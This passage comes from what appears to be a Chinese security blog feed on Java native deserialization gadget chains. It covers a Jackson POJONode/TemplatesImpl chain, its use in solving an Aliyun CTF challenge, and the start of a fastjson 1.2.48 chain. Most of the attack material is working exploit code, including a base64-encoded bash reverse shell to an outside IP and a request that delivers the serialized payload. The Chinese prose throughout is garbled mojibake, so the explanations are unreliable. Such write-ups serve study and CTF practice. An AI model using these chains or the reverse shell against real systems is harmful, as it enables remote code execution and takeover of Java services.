constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410131232076.png" alt="image-20241013123218942"></p><p>è¿™æ˜¯ä¼šå‘ç°æˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™å‡ºé”™äº†</p><p>æ ¹æ®é”™è¯¯å…ˆå»çœ‹ObjectOuptputStream#writeObject0æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410131234990.png" alt="image-20241013123431941"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šåˆ¤æ–­åºåˆ—åŒ–ç±»æ˜¯å¦å®ç°äº†writeReplaceæ–¹æ³•ï¼Œå®ç°äº†åˆ™ä¼šè¿›è¡Œè°ƒç”¨ï¼Œè€Œåœ¨BaseJsonNodeä¸­å®ç°äº†è¯¥æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•è°ƒç”¨çš„æ—¶å€™æŠ›å‡ºäº†å¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/202410131237369.png" alt="image-20241013123712324"></p><p>æ–‡ç« ä¸­ç›´æ¥å°†è¯¥æ–¹æ³•æ³¨é‡Šæˆ–åˆ å»å°±æ­£å¸¸äº†ï¼Œæˆ‘å‹’ä¸ªç®€å•ç²—æš´å•ŠğŸ˜¢</p><p>è¿™é‡Œéœ€è¦é‡å†™ä¸€ä¸‹jaråŒ…ï¼Œä¹‹å‰æ²¡å†™è¿‡é¡ºä¾¿è®°å½•ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.æ‰¾åˆ°ä½ æ‰€è¦é‡å†™çš„æ–¹æ³•çš„æ‰€åœ¨ç±»ï¼ŒæŸ¥çœ‹å…¶ä¸­çš„è·¯å¾„ï¼›<br><br>2.åœ¨æˆ‘ä»¬çš„srcç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåŒåŒ…ååŒç±»åçš„ç±»ï¼›<br><br>3.å°†jaråŒ…ä¸­çš„é‡å†™æ–¹æ³•æ‰€åœ¨ç±»çš„æ‰€æœ‰ä»£ç å¤åˆ¶åˆ°æˆ‘ä»¬æ–°å»ºçš„åŒåŒ…ååŒç±»åçš„ç±»ä¸­ï¼›<br><br>4.åœ¨æˆ‘ä»¬æ–°å»ºçš„åŒåŒ…ååŒç±»åçš„ç±»ä¸­ä¿®æ”¹å¯¹åº”çš„æ–¹æ³•ä¸­çš„ä»£ç <br><br>åŸç†ï¼š<br>ç¼–è¯‘è¾“å‡ºçš„æ—¶å€™ä¼šä¼˜å…ˆä½¿ç”¨æˆ‘ä»¬srcä¸‹é¢çš„ç±»ï¼Œè€Œä¸æ˜¯ä¼˜å…ˆä½¿ç”¨JaråŒ…é‡Œé¢çš„ç±»ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†è¦†ç›–jaråŒ…æ–¹æ³•çš„ç›®çš„<br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_41512902/article/details/125558275">https://blog.csdn.net/qq_41512902/article/details/125558275</a></p><p>æœ€åæ”¹æˆè¿™æ ·å°±è¡Œäº†</p><p><img src="https://cdn.clown2024.cn/202410131251160.png" alt="image-20241013125145111"></p><p>å†å»æ‰“ä¸€éexpè¯•è¯•</p><p><img src="https://cdn.clown2024.cn/202410131252817.png" alt="image-20241013125207733"></p><p>ç°åœ¨å°±èƒ½æ­£å¸¸å¼¹è®¡ç®—å™¨äº†</p><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><p>è¿™é‡Œå°±é‚£é˜¿é‡Œäº‘ctfçš„ä¸€é“é¢˜æ¥ä½œä¸ºä¾‹å­</p><p>é¢˜ç›®é™„ä»¶ï¼š<a href="https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1">https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1</a></p><p>åç¼–è¯‘ä¸‹jaråŒ…</p><p><img src="https://cdn.clown2024.cn/202410131311887.png" alt="image-20241013131145827"></p><p>å°±å‡ è¡Œä»£ç ï¼Œç›´æ¥è¯»å–æ•°æ®ååºåˆ—åŒ–</p><p>çœ‹äº†ä¸€ä¸‹ä¾èµ–å°±åªæœ‰springbootï¼Œé‚£è‚¯å®šæ˜¯æ‰“jacksonäº†ï¼Œspringbootä¾èµ–é»˜è®¤ç”¨jacksonï¼Œè€Œä¸”éƒ½æ”¾åˆ°è¿™å½“ä¾‹é¢˜äº†</p><p>é‚£å°±å¯ä»¥ç”¨å‰é¢çš„expæ‰“ä¸€ä¸ªJacksonåŸç”Ÿååºåˆ—åŒ–ï¼Œè¿™é‡Œè¿˜è¦è€ƒè™‘ä¸€ä¸ªé—®é¢˜å°±æ˜¯payloadçš„å‘é€ï¼Œå› ä¸ºè¿™é‡Œæ²¡æœ‰base64è§£ç ç›´æ¥copyè¿‡å»ä¼šå‡ºé”™ï¼Œæˆ‘è¿™é‡Œç›´æ¥ç”¨javaå‘è¯·æ±‚è¿‡å»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.attack;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">attack_usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjEuMjguMjQ3Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        System.out.println(byteArray);<br><br>        <span class="hljs-comment">//å‘é€Postè¯·æ±‚</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8080/bypassit&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        conn.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        conn.setDoOutput(<span class="hljs-literal">true</span>);<br>        conn.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        conn.getOutputStream().write(byteArray);<br>        conn.getOutputStream().flush();<br><br>        <span class="hljs-comment">// è¯»å–å“åº”</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> conn.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è®°å¾—è¦åˆ é™¤writeReplaceæ–¹æ³•</p></blockquote><p>åå¼¹shellè¿‡æ¥å³å¯</p><p><img src="https://cdn.clown2024.cn/202410140030909.png" alt="image-20241014003050846"></p><p>æˆ–è€…ç›´æ¥åºåˆ—åŒ–å­˜å…¥æ–‡ä»¶ï¼Œç„¶åç”¨pythonå‘è¯·æ±‚</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;&quot;</span><br>data=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>res=requests.post(url,data=data)<br></code></pre></td></tr></table></figure><h1 id="å…¶ä»–é“¾å­"><a href="#å…¶ä»–é“¾å­" class="headerlink" title="å…¶ä»–é“¾å­"></a>å…¶ä»–é“¾å­</h1><p>æ¯”å¦‚Templatesè¢«bançš„æƒ…å†µä¸‹ç”¨SignObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ï¼Œå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr=iQGkDRQI23Ezabx&u_atoken=8440f6b703af0eb6335929f9798f602f&u_asig=ac11000117287520205018812e007f#toc-34">https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr%3DiQGkDRQI23Ezabx&amp;u_atoken=8440f6b703af0eb6335929f9798f602f&amp;u_asig=ac11000117287520205018812e007f#toc-34</a></p><p>è¿˜æœ‰å…¶ä½™çš„å°±åœ¨åšé¢˜æ—¶é‡åˆ°å†å­¦å§</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&amp;u_asig=1a0c381017287414696367848e00f7&quot;&gt;https://xz.a</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>fastjsonåŸç”Ÿååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-11T04:15:15.000Z</published>
    <updated>2024-10-11T09:21:33.257Z</updated>
    
    <content type="html"><![CDATA[<p>çœ‹äº†fastjsonçš„å„ç‰ˆæœ¬é“¾å­ï¼Œå†çœ‹ä¸€ä¸‹fastjsonçš„åŸç”Ÿååºåˆ—åŒ–ï¼Œçœ‹çš„æ˜¯y4å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« </p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p><p>æ¥ç®€å•çš„å­¦ä¹ å¤ç°ä¸€ä¸‹</p><h1 id="åˆ©ç”¨é™åˆ¶"><a href="#åˆ©ç”¨é™åˆ¶" class="headerlink" title="åˆ©ç”¨é™åˆ¶"></a>åˆ©ç”¨é™åˆ¶</h1><p>Fastjson1ç‰ˆæœ¬å°äºç­‰äº1.2.48(ä¸è¿‡1.2.49ä¹‹åä¹Ÿæœ‰ç»•è¿‡æ–¹æ³•ï¼Œè¿™é‡ŒæŒ‡çš„æ˜¯ç›´æ¥ç”¨ä¸éœ€è¦ç»•è¿‡çš„)</p><p>Fastjson2&lt;&#x3D;2.0.26(æˆ‘è‡ªå·±æµ‹è¯•åˆšå¥½åœ¨æ–‡ç« ç‰ˆæœ¬çš„ä¸‹ä¸€ä¸ªç‰ˆæœ¬2.0.27å¼€å§‹å°±ä¸è¡Œäº†)</p><h1 id="æ‰¾é“¾å­"><a href="#æ‰¾é“¾å­" class="headerlink" title="æ‰¾é“¾å­"></a>æ‰¾é“¾å­</h1><p>è¦ç”¨åŸç”Ÿååºåˆ—åŒ–ï¼Œå°±éœ€è¦å¯»æ‰¾fastjsonä¸­ç»§æ‰¿äº†Serializableæ¥å£çš„ç±»ï¼Œfastjsoné‡Œé¢æœ‰ä¸¤ä¸ªè¿™æ ·çš„ç±»ï¼šJSONArrayä¸JSONObject</p><p>è¿™ä¸¤ä¸ªç±»çš„åˆ©ç”¨æ–¹å¼å·®ä¸å¤šï¼Œè¿™é‡Œç”¨JSONArrayè¿™ä¸ªç±»</p><p>è¿™ä¸¤ä¸ªæœ¬èº«æ˜¯æ²¡æœ‰å®ç°readObjectæ–¹æ³•çš„ï¼Œæ‰€ä»¥æ˜¯é€šè¿‡å…¶ä»–ç±»çš„readObjectæ¥è§¦å‘JSONArrayä¸JSONObjectä¸­çš„æŸä¸ªæ–¹æ³•æ¥å½¢æˆé“¾å­ã€‚</p><p>æ–‡ç« ä¸­çš„å°±æ˜¯åˆ©ç”¨JSONçš„toStringæ–¹æ³•è§¦å‘JSONçš„toJsonStringçš„è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/202410111309567.png" alt="image-20241011130936507"></p><p>è¿™å’ŒJSONObjectä»¥åŠJSONArrayæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œæˆ‘å»çœ‹äº†æºç ï¼ŒJSONArrayå’ŒJSONObjectæ˜¯JSONçš„å­ç±»ï¼Œä»–ä»¬æœ¬èº«æ˜¯æ²¡æœ‰toStringæ–¹æ³•çš„ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°å…¶çˆ¶ç±»JSONçš„toStringæ–¹æ³•</p><p>é‚£ä¸ºä»€ä¹ˆè¦è§¦å‘toStringå‘¢ï¼Œå› ä¸ºJSONObjectå’ŒJSONArrayåœ¨è§¦å‘toStringæ–¹æ³•çš„æ—¶å€™ä¼šè°ƒç”¨getæ–¹æ³•ï¼Œæ¬¸é‚£å°±å¯ä»¥ç”¨æ¥å°†æˆ‘ä»¬çš„é“¾å­å°è£…åœ¨é‡Œé¢æ¥è§¦å‘äº†</p><p>getè§¦å‘ä¾‹å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// JSONObjectè°ƒç”¨toString</span><br>        HashMap&lt;String,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;clown&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">org</span>.clown.Test1.Student());<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(hashMap);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> jsonObject.toString();<br>        System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br><br>        <span class="hljs-comment">// JSONArrayè°ƒç”¨toString</span><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>());<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(arrayList);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string1</span> <span class="hljs-operator">=</span> objects.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111324454.png" alt="image-20241011132452413"></p><p>è‡³äºä¸ºä»€ä¹ˆtoStringä¼šè°ƒç”¨getteræ–¹æ³•å°±çœ‹æ–‡ç« çš„åˆ†æäº†è§£ä¸€ä¸‹å°±å¥½äº†</p><h1 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ " class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h1><p>èƒ½è§¦å‘getteræ–¹æ³•å°±å¾ˆå®¹æ˜“æƒ³åˆ°é€šè¿‡è§¦å‘TemplatesImplçš„getOutputPropertiesæ–¹æ³•å®ç°åŠ è½½ä»»æ„å­—èŠ‚ç æœ€ç»ˆè§¦å‘æ¶æ„æ–¹æ³•è°ƒç”¨</p><p>ç„¶åè§¦å‘toStringæ–¹æ³•æˆ‘ä»¬å¯ä»¥åˆ©ç”¨BadAttributeValueExpExceptionæ¥è§¦å‘ï¼Œè¯¥ç±»åœ¨ccå’Œromeé“¾éƒ½æœ‰ç”¨åˆ°</p><p>é‚£ä¹ˆé“¾å­æˆ‘ä»¬å°±å¯ä»¥å†™å‡ºæ¥äº†ï¼Œè¿™é‡Œç”¨javassiståŠ¨æ€ç”Ÿæˆæ¶æ„ç±»</p><p><strong>åˆ©ç”¨ä¾èµ–</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.48<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>åˆ©ç”¨é“¾</strong></p><p>fastjson1çš„åˆ©ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span 